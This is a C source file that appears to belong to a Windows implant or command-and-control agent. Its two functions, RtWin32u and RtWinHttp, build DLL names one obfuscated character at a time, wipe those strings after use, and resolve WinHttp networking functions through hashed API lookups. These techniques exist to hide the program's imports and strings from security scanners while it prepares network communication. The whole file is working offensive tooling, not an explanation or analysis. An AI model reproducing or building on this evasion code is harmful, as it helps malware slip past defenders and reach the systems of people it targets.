#include <Ldr.h>
#include <core/Runtime.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <common/Defines.h>

#include <common/Debug.h>


BOOL
RtWin32u(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[  0 ] = HideChar( 'W' );
    ModuleName[  1 ] = HideChar( 'I' );
    ModuleName[  2 ] = HideChar( 'N' );
    ModuleName[  3 ] = HideChar( '3' );
    ModuleName[  4 ] = HideChar( '2' );
    ModuleName[  5 ] = HideChar( 'U' );
    ModuleName[  6 ] = HideChar( '.' );
    ModuleName[  7 ] = HideChar( 'D' );
    ModuleName[  8 ] = HideChar( 'L' );
    ModuleName[  9 ] = HideChar( 'L' );
    ModuleName[ 10 ] = HideChar( '\0' );

    if ( ( Instance->Modules.Win32u = LdrLoadModule( ModuleName ) ) ) 
    {
        MemZero( ModuleName, sizeof( ModuleName ) );

        PUTS( "[+] Loaded Win32u Module" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "[-] Failed to load Win32u" )
        return FALSE;
    }

    return TRUE;
}


BOOL
RtWinHttp(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[  0 ] = HideChar( 'W' );
    ModuleName[  1 ] = HideChar( 'I' );
    ModuleName[  2 ] = HideChar( 'N' );
    ModuleName[  3 ] = HideChar( 'H' );
    ModuleName[  4 ] = HideChar( 'T' );
    ModuleName[  5 ] = HideChar( 'T' );
    ModuleName[  6 ] = HideChar( 'P' );
    ModuleName[  7 ] = HideChar( '.' );
    ModuleName[  8 ] = HideChar( 'D' );
    ModuleName[  9 ] = HideChar( 'L' );
    ModuleName[ 10 ] = HideChar( 'L' );
    ModuleName[ 11 ] = HideChar( '\0' );

    if ( ( Instance->Modules.WinHttp = LdrLoadModule( ModuleName ) ) ) 
    {
        MemZero( ModuleName, sizeof( ModuleName ) );

        Instance->WinHttp.WinHttpOpen            = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpOpen ) );
        Instance->WinHttp.WinHttpConnect         = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpConnect ) );
        Instance->WinHttp.WinHttpOpenRequest     = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpOpenRequest ) );
        Instance->WinHttp.WinHttpSetOption       = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpSetOption ) );
        Instance->WinHttp.WinHttpSendRequest     = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpSendRequest ) );
        Instance->WinHttp.WinHttpReceiveResponse = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpReceiveResponse ) );
        Instance->WinHttp.WinHttpQueryHeaders    = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpQueryHeaders ) );
        Instance->WinHttp.WinHttpReadData        = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpReadData ) );
        Instance->WinHttp.WinHttpCloseHandle     = LdrGetFuncAddr( Instance->Modules.WinHttp, H_API( WinHttpCloseHandle ) );

        PUTS( "[+] Loaded WinHttp Functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "[-] Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
